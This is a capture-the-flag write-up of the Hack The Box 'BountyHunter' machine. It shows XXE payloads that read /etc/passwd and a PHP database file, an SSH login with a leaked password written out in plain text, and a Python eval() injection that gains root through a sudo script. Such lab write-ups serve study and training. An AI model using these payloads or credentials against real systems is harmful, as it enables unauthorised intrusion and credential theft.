# BountyHunter
> Write-up author: jon-brandy

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/613afa1f-de50-44cd-8b0c-25fa9d6abf57)

## STEPS:
> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.100 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-17 02:42 PDT
Nmap scan report for 10.10.11.100
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
```

1. Based from the nmap results, the machine runs a web application and opens ssh login.

> WEBAPP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d55476aa-4511-4a38-ac70-f16e5f0a568c)


2. After ran dirbuster, found several dirs and files.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/498ca093-98a1-41ed-ba0b-f68309c43caf)


3. Long story short, **portal.php** AND **db.php** could be our interest.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0f7b0715-f102-44ff-b71f-03dc15d99366)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3150f267-374d-4dd8-937c-5486ea6e4577)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a36e25bd-c459-480d-be95-2b4864740626)


#### NOTES:

```
Can't access db.php file, dunno why even though the status code is 200. 
```

4. Let's start by sending random data and intercept the request using burpsuite.

> DATA TO SEND

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ed4ca98a-cc06-410b-a04a-5113303739b7)


> RESULT IN BURP

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/02bd4583-bd02-4cf9-9220-69149bc0678b)


5. Interesting, our data is url encoded (judging from %3D), let's throw that to cyberchef.

> RESULT IN CYBERCHEF

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/19e5c515-9049-458e-8fc2-e1d63737a46a)


6. Interesting! Our request is formatted in xml. This should be our foothold if we can do XXE. Let's try the basic payload to test if it is vuln to XXE.

> COMMON ONE

```
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
```

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<bugreport>
<title>aa</title>
	<cwe>&file;</cwe>
	<cvss>aaaa</cvss>
	<reward>80000</reward>
</bugreport>
```

7. Encode it to base64 + url. Send it afterwards.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/d077e50c-6077-44f0-a540-4cd7613aace0)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3c8b5c2c-cffc-4938-9f79-bf029aa905ba)



8. Turns out, it does vulnerable to XXE.
9. Nice, this should be our foothold.
10. Noticed, we already leak the username.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0cea2752-0ecb-4f74-adee-0d95b3d43c3d)


11. Remembering that this is an Apache's server and it stores data, hence we can leak database file at `/var/www/html`. But again, for safety, we need to encode the result in base64 so there are no chars missing.

> COMMAND

```
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
```

> FULL PAYLOAD

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/db.php"> ]>
<bugreport>
<title>aa</title>
	<cwe>&file;</cwe>
	<cvss>aaaa</cvss>
	<reward>80000</reward>
</bugreport>
```


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d6aafd9-41ab-466a-ba93-dad92ec14a79)


![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c97a03f6-1872-4e89-96be-e4b4b7bdb0c4)


12. Ok, there is an assumption of `possibilites of password reuse`. Let's try run ssh to the remote server, set the username as development, and password as --> m19RoAU0hP41A1sTsq6K.

> RESULT - WE LOGGED IN

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/84736ebc-75a0-4554-b0f9-9092de21ffa7)


> GETTING USER FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7204a05d-b100-4b65-bbf6-1b41f5a960ba)


## USER FLAG

```
312798040985116fe3baac54ab9f0c36
```

13. Since we logged in using cred, hence we can check sudo permissions for this user.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f28b8ed0-8dbe-4528-bc62-df960fae6384)


14. Let's check what's inside the python file.

```py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

15. Notice it uses **eval()** which could be our foothold for privesc.
16. Reviewing the source code, we shall notice that the ticketcode must be divisible by 7 and contains 4 remainders. Also the validationNumber must be more than 100.

### INSIDE OUR PAYLOAD

Based from the source code, our payload file must contain these:
1. First row should be --> # Skytrain Inc
2. Second row should be ## Ticket to
3. Ticket code, starts with --> "__Ticket Code:__"
4. Line after the ticket code must start with --> "**".
5. Text after "**" until the first "+" must be integer and it should be divisible by 7 and contains 4 remainders.
6. Lastly, the file extension must be .md. 

> PAYLOAD

```
# Skytrain Inc
## Ticket to Mars
__Ticket Code:__
**
```

17. Anyway I found several tickets that can be our example to validate whether the format we send is correct or not.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8066cb0d-c55c-44b3-90c1-8a46822a5853)


18. Using the first ticket it says invalid.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1998016c-e171-4737-a625-736415b58591)


19. Long story short found one potential ticket, it just missing the __Ticket Code:__ line.

> COMPLETE CRITERIA:

```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43**
##Issued: 2021/04/06
#End Ticket
```

20. Let's make a file contains our payload at /tmp directory, then run it to check whether it's valid or not.

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9086cee9-d674-468d-ae7d-ce36597d7aed)


21. It is valid!! Let's try to use the basic pyjail payload.

> PAYLOAD

```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+ __import__('os').system('id')**
##Issued: 2021/04/06
#End Ticket
```

> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1beb9894-e59e-49a3-8a27-36576d21f343)


22. Since it's being run as root, we can use this to do privesc.

> PAYLOAD

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1b2cb282-41ba-4b3e-8345-e7885e693ca2)


> RESULT

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/752c05fc-43bc-496c-b482-982816c2a2fc)


> GETTING ROOT FLAG

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/db55f686-5918-4e11-a76a-14beee7ead95)


## ROOT FLAG

```
e1218f9c9f5e9d7beff7e8bf77ce941d
```
